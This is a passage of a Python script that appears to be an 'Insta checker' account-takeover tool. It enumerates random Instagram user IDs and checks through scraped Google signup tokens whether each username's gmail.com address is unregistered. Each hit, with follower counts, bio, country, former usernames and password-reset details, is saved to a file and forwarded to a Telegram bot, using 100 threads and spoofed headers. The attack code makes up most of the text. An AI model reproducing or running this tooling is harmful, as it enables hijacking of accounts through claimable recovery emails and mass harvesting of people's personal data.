            res1 = requests.get(f"{CONFIG['google_url']}{endpoint}", headers=headers)
            if res1.status_code != 200:
                continue
            tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
            if not tok:
                continue
            tl = tok.group(2)
            cookies = {'__Host-GAPS': host}
            headers.update({
                'authority': 'accounts.google.com',
                'origin': CONFIG["google_url"],
                'referer': f"{CONFIG['google_url']}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
                'user-agent': random.choice(USER_AGENTS)
            })
            data = {
                'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
            }
            response = requests.post(
                f"{CONFIG['google_url']}/_/signup/validatepersonaldetails",
                cookies=cookies, headers=headers, data=data
            )
            tl_new = response.text.split('",null,"')[1].split('"')[0] if '",null,"' in response.text else None
            if tl_new:
                tl = tl_new
            host = response.cookies.get_dict().get('__Host-GAPS', host)
            with open(CONFIG["token_file"], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return True
        except Exception:
            continue
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': random.choice(USER_AGENTS),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-same-domain': '1'
        }
        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'en'
        }
        email = ''.join(choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26)))
        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
        response = requests.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params, headers=headers, data=data
        )
        tl_match = re.search(r'"TL:([^"]+)"', response.text)
        if tl_match:
            tl = tl_match.group(1)
            host = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for _ in range(randrange(15, 30)))
            with open(CONFIG["token_file"], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return True
    except Exception:
        pass
    return False

def get_tl_background():
    while True:
        try:
            url = "https://accounts.google.com/_/signup/validatepersonaldetails"
            params = {
                'hl': "en-GB",
                '_reqid': "46000",
                'rt': "j"
            }
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': "[\"AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': ""
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
                'x-same-domain': "1",
                'google-accounts-xsrf': "1",
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': "\"Android\"",
                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
                'origin': "https://accounts.google.com",
                'x-client-data': "CP/xygE=",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            tl_1 = json.loads(response.text[5:])[0][1][2]
            url = "https://accounts.google.com/_/signup/validatebasicinfo"
            params = {
                'hl': "en-GB",
                'TL': tl_1,
                '_reqid': "346000",
                'rt': "j"
            }
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': "[\"TL:"+ tl_1 +"\",2015,4,15,2,null,null,0,null,null,0,0]",
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': ""
            }
            headers['referer'] = "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl_1
            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            tl = json.loads(response.text[5:])[0][0][4].split("TL:")[1]
            with open("google.txt", "w") as w:
                w.write(tl)
        except:
            pass
        time.sleep(120)

def cgmail(email, token, chat_id, user, session):
    global bad_email, taken, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        try:
            with open(CONFIG["token_file"], 'r') as f:
                line = f.read().splitlines()[0]
                tl, host = line.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': CONFIG["form_type"],
                'google-accounts-xsrf': '1',
                'origin': CONFIG["google_url"],
                'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                'user-agent': random.choice(USER_AGENTS)
            }
            params = {'TL': tl}
            data = (
                f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
            )
            resp = session.post(
                f"{CONFIG['google_url']}/_/signup/usernameavailability",
                params=params, cookies=cookies, headers=headers, data=data
            )
            if '"gf.uar",1' in resp.text:
                save_hit(email, "gmail.com", user, token, chat_id)
                return
        except:
            pass
        try:
            with open("google.txt", "r") as ys:
                tl = ys.read().strip()
            url = "https://accounts.google.com/_/signup/usernameavailability"
            params = {
                'hl': "en-GB",
                'TL': tl,
                '_reqid': "446000",
                'rt': "j"
            }
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': "[\"TL:"+ tl +"\",\""+ email +"\",0,0,1,null,1,2464]",
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': ""
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
                'x-same-domain': "1",
                'google-accounts-xsrf': "1",
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': "\"Android\"",
                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
                'origin': "https://accounts.google.com",
                'x-client-data': "CP/xygE=",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl,
                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            if '"gf.uar",1' in response.text:
                save_hit(email, "gmail.com", user, token, chat_id)
                return
            else:
                taken += 1
        except:
            taken += 1
        bad_email += 1
    except:
        bad_email += 1

def cinstagram(email, token, chat_id, user, session):
    global good_insta, bad_insta
    if lookup_instagram(email):
        good_insta += 1
        cgmail(email, token, chat_id, user, session)
    else:
        bad_insta += 1

def save_hit(username, domain, user, token, chat_id):
    global hits, total, good_insta, follower_0_50, follower_50_250, follower_250_plus
    with hit_lock:
        user_id = user.get('pk', 'Unknown')
        followers = user.get('follower_count', 0)
        posts = user.get('media_count', 0)

        hits += 1
        total += 1
        good_insta += 1

        if followers < 50:
            follower_0_50 += 1
        elif followers < 250:
            follower_50_250 += 1
        else:
            follower_250_plus += 1

        current_hit_number = total
        reset_text = rest_v1(username)

        if not about_tokens.get("fb_dtsg"):
            about_refresh_tokens(ABOUT_COOKIE_STR, username)
        about = get_about_account(user_id, username)
        join_date = about.get("join_date") or str(gdate(user_id))
        country_name = about.get("country") or "-"
        country_flag = get_country_flag(country_name)
        country_display = f"{country_name} {country_flag}".strip() if country_flag else country_name

        if max_CONFIG.get("max_country", False):
            if not country_flag or country_name in ["-", "Paylasilmadi", "None", ""]:
                return

        former = ", ".join(about.get("former_usernames", [])) or "-"
        account_year = gdate(user_id)
        year_label = f"{account_year}" if account_year else "Unknown"
        masked = get_masked(username)

        if max_CONFIG.get("max_about_info", True):
            about_lines = (
                "╭━━━〔 ✦ 𝐀𝐁𝐎𝐔𝐓 𝐔𝐒𝐄𝐑 ✦ 〕━━━╮\n"
                f"┃ 🗓️ 𝐃𝐚𝐭𝐞 𝐉𝐨𝐢𝐧𝐞𝐝     ➤ {join_date}\n"
                f"┃ 📆 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐘𝐞𝐚𝐫    ➤ {year_label}\n"
                f"┃ 🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲         ➤ {country_display}\n"
                f"┃ 🔁 𝐅𝐨𝐫𝐦𝐞𝐫 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞𝐬 ➤ {former}\n"
                "╰━━━━━━━━━━━━━━━━━━━━━━━╯"
            )
        else:
            about_lines = ""

        masked_line = f" Masked Email   : {masked}\n" if masked else ""

        output = f"""
𓆩════════════════════════════════════𓆪
           ✦ 𝐇𝐈𝐓 #{current_hit_number} ✦
𓆩════════════════════════════════════𓆪

╭────────────── ✦ ──────────────╮
│          👤 𝐔𝐒𝐄𝐑 • 𝐈𝐍𝐅𝐎
├───────────────────────────────┤
│ ◈ 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞  ➤ @{username}
│ ◈ 𝐄𝐦𝐚𝐢𝐥      ➤ {username}@gmail.com
│ ◈ 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬  ➤ {followers}
│ ◈ 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠  ➤ {user.get('following_count', 0)}
│ ◈ 𝐁𝐢𝐨        ➤ {user.get('biography', 'No bio')}
│ ◈ 𝐘𝐞𝐚𝐫       ➤ {year_label}
│ ◈ 𝐑𝐞𝐬𝐞𝐭      ➤ {reset_text}
╰────────────── ✦ ──────────────╯

{about_lines}
{masked_line}

╭────────────── ✦ ──────────────╮
│ 🔗 𝐏𝐑𝐎𝐅𝐈𝐋𝐄
│ ➤ https://www.instagram.com/{username}
╰────────────── ✦ ──────────────╯

𓆩════════════════════════════════════𓆪
│ ✦ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ➤ @stuff_portal
│ ✦ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 ➤ MAX
𓆩════════════════════════════════════𓆪
"""

        with open(CONFIG["output_file"], 'a', encoding='utf-8') as f:
            f.write(output + "\n\n")

        try:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat_id, "text": output},
                timeout=15
            )
        except:
            pass

def stats():
    global hits, good_insta, bad_insta, bad_email, total, taken, limit, email
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{M}{B}
╭━━━═══☾═══━━━╮
   ✧ 𝐈𝐍𝐒𝐓𝐀 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ✧
      𝐏 𝐀 𝐍 𝐄 𝐋
╰━━━═══☽═══━━━╯
{RESET_COL}""")
        print(f"""{C}{B}
╭─────────── 𖦹 ───────────╮
{G}{B}│ ✦ 𝐇𝐢𝐭𝐬         ➤ {W}{B}{hits}
{M}{B}│ ✦ 𝐆𝐨𝐨𝐝 𝐔𝐬𝐞𝐫𝐬   ➤ {W}{B}{good_insta}
{R}{B}│ ✦ 𝐁𝐚𝐝 𝐔𝐬𝐞𝐫𝐬    ➤ {W}{B}{bad_insta}
{Y}{B}│ ✦ 𝐁𝐚𝐝 𝐄𝐦𝐚𝐢𝐥𝐬   ➤ {W}{B}{bad_email}
{C}{B}│ ✦ 𝐓𝐚𝐤𝐞𝐧        ➤ {W}{B}{taken}
{M}{B}│ ✦ 𝐓𝐨𝐭𝐚𝐥        ➤ {W}{B}{total}
{C}{B}╰─────────── 𖦹 ───────────╯
{RESET_COL}""")
        print(f"""{C}{B}
╭━━━═══𖤐═══━━━╮
     ✧ 𝐍𝐎𝐖 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 ✧
╰━━━═══𖤐═══━━━╯

        {M}☾ {email} ☽{C}

     ✦ 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ✦
{RESET_COL}""")
        print(f"""{C}{B}
╔═══━━━─── ✦ ───━━━═══╗
{Y}{B}     𝐃𝐄𝐕 ➤ MAX
{M}{B}   𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ➤ @stuff_portal
{C}{B}╚═══━━━─── ✦ ───━━━═══╝
{RESET_COL}""")
        time.sleep(0.3)

def sinsta(min_id, max_id, token, chat_id):
    global email
    local_session = requests.Session()
    while True:
        try:
            user_id = random.randrange(min_id, max_id)
            rnd = str(random.randint(2500000000, 21254029834))
            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
            lsd = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(16))
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/cristiano/following/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd,
            }
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': '{"userID":"' + str(user_id) + '","username":"cristiano"}',
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            resp = local_session.post(CONFIG["insta_graphql"], headers=headers, data=data)
            if resp.status_code == 200:
                user = resp.json().get('data', {}).get('user')
                if user and user.get('username'):
                    followers = user.get('follower_count', 0)
                    uid = user.get('pk', 0)

                    # Minimum follower filter (50)
                    if max_CONFIG["max_min_followers"] > 0 and followers < max_CONFIG["max_min_followers"]:
                        continue

                    email = user['username'] + CONFIG["domain"]
                    cinstagram(user['username'] + CONFIG["domain"], token, chat_id, user, local_session)
        except:
            continue

def main():
    global TOKEN, CHAT_ID
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{M}{B}
╔═══━━━─── ✦ ───━━━═══╗
        𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐒𝐄𝐓𝐔𝐏
╚═══━━━─── ✦ ───━━━═══╝
{RESET_COL}""")
    TOKEN = input(
f"""{C}{B}
╭──────────── ✦ ────────────╮
│      𝐄𝐍𝐓𝐄𝐑 𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍
╰──────────── ✦ ────────────╯
{M}➤ {RESET_COL}"""
    ).strip()
    if not TOKEN:
        print(
f"""{R}{B}
╔═══━━━─── ⚠ ───━━━═══╗
        𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐍𝐏𝐔𝐓
╚═══━━━─── ⚠ ───━━━═══╝

╭──────────── ✦ ────────────╮
│  𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 𝐈𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃
╰──────────── ✦ ────────────╯
{RESET_COL}"""
        )
        sys.exit()
    CHAT_ID = input(
f"""{C}{B}
╭──────────── ✦ ────────────╮
│       𝐄𝐍𝐓𝐄𝐑 𝐂𝐇𝐀𝐓 𝐈𝐃
╰──────────── ✦ ────────────╯
{M}➤ {RESET_COL}"""
    ).strip()
    if not CHAT_ID:
        print(
f"""{R}{B}
╔═══━━━─── ⚠ ───━━━═══╗
        𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐍𝐏𝐔𝐓
╚═══━━━─── ⚠ ───━━━═══╝

╭──────────── ✦ ────────────╮
│   𝐂𝐇𝐀𝐓 𝐈𝐃 𝐈𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃
╰──────────── ✦ ────────────╯
{RESET_COL}"""
        )
        sys.exit()

    _next_about_session()
    about_refresh_tokens(ABOUT_COOKIE_STR)
    Thread(target=about_token_refresher, daemon=True).start()
    Thread(target=get_tl_background, daemon=True).start()
    Thread(target=stats, daemon=True).start()
    gtokens()
    os.system('cls' if os.name == 'nt' else 'clear')

    MAX_WORKERS = 100
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for _ in range(MAX_WORKERS):
            low, high, yr = get_random_year_range()
            futures.append(executor.submit(sinsta, low, high, TOKEN, CHAT_ID))
        try:
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        except KeyboardInterrupt:
            print(f"\n{R}{B}[!] Interrupted by user. Exiting...{RESET_COL}")
            executor.shutdown(wait=False, cancel_futures=True)
            sys.exit(0)

if __name__ == "__main__":
    main()
